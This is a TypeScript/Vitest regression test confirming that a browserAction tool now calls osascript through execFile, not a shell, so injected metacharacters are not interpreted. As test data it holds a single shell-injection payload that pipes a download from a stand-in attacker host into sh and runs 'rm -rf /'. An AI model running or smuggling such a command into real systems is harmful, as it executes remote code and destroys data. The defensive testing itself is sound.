/**
 * Regression test for the browserAction shell-injection fix.
 *
 * browserAction previously ran `osascript -e ${JSON.stringify(script)}` through
 * node:child_process's `exec`, which shells out via `/bin/sh -c`. A url/js value
 * containing shell metacharacters ($(...), backticks) survived AppleScript-level
 * escaping (asEscape only escapes backslash/quote) and JSON.stringify (still a
 * shell double-quoted string) and would be interpreted by the shell.
 *
 * Fix: use execFile("osascript", args, ...) — an array of real argv entries,
 * never joined into a shell command string, so there is no shell to interpret
 * metacharacters. This test mocks node:child_process to assert (a) execFile is
 * used instead of exec for the applescript backend, and (b) a malicious payload
 * arrives in the args array as a raw, untouched string.
 */
import { describe, it, expect, vi, afterEach } from "vitest";

const { execFileMock, execMock } = vi.hoisted(() => ({
  execFileMock: vi.fn(
    (
      _cmd: string,
      _args: string[],
      _opts: unknown,
      callback: (err: unknown, result: { stdout: string; stderr: string }) => void,
    ) => callback(null, { stdout: "", stderr: "" }),
  ),
  execMock: vi.fn(),
}));

vi.mock("node:child_process", () => ({
  exec: execMock,
  execFile: execFileMock,
}));

import { browserAction } from "../../../src/tools/personal.js";

describe("browserAction — shell injection regression", () => {
  const origBackend = process.env["BROWSER_BACKEND"];

  afterEach(() => {
    if (origBackend === undefined) delete process.env["BROWSER_BACKEND"];
    else process.env["BROWSER_BACKEND"] = origBackend;
    execFileMock.mockClear();
    execMock.mockClear();
  });

  it("uses execFile, never exec, for the applescript backend", async () => {
    process.env["BROWSER_BACKEND"] = "applescript";
    await browserAction("open_url", { url: "https://example.com" });

    expect(execMock).not.toHaveBeenCalled();
    expect(execFileMock).toHaveBeenCalledTimes(1);
    expect(execFileMock.mock.calls[0]?.[0]).toBe("osascript");
  });

  it("passes a shell-metacharacter payload through as a raw argv entry, unexploited", async () => {
    process.env["BROWSER_BACKEND"] = "applescript";
    const payload = '$(curl attacker.example/x|sh) `id` && rm -rf /';
    await browserAction("run_js", { js: payload });

    const args = execFileMock.mock.calls[0]?.[1] as string[];
    expect(args[0]).toBe("-e");
    // The payload must appear verbatim (AppleScript-quote-escaped only) inside a
    // single argv entry — never split, joined, or handed to a shell for
    // interpretation of $(...) / backticks.
    const scriptLine = args.find((a) => a.includes("do JavaScript"));
    expect(scriptLine).toContain(payload);

    // Prove no argv entry looks like a shell command line built via string
    // concatenation (e.g. containing "osascript -e" as one blob).
    for (const arg of args) {
      expect(arg.startsWith("osascript")).toBe(false);
    }
  });

  it("still emits one -e per AppleScript line for legitimate multi-line scripts", async () => {
    process.env["BROWSER_BACKEND"] = "applescript";
    await browserAction("open_url", { url: "https://example.com" });

    const args = execFileMock.mock.calls[0]?.[1] as string[];
    // open_url's script is 4 lines -> 4 "-e" flags, each followed by one line.
    const eFlagCount = args.filter((a) => a === "-e").length;
    expect(eFlagCount).toBe(4);
    expect(args.length).toBe(eFlagCount * 2);
  });
});
